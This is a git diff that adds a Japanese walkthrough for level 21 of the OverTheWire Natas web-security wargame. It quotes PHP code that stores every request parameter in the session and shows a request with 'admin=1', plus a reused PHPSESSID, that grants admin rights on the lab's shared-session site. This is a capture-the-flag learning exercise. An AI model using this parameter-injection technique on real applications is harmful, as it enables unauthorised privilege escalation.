@@ -111,7 +111,39 @@ $example = "<div style='$style'>Hello world!</div>";
 ```
 
 
-こんな感じ。  
+今回も admin=1 を目指す問題  
+
+注目すべきは以下の部分  
+```
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+```
+
+ユーザーから送られたパラメータを$_SESSIONに保存している。  
+
+ブラウザの開発者モードで以下のようにして送信してみる。  
+![](img/natas21-3.png)  
+
+
+パラメータは以下の通り↓  
+```
+align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
+```
+
+
+送信を行ったらPHPSESSIDをコピーし、`natas21.natas`の方にセットし送信する。  
+
+また以下のようにGETリクエストのURLに付加する方法でもできる  
+```
+http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug&align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
+```
+
+![](img/natas21-4.png)  
+
+
 
 
 
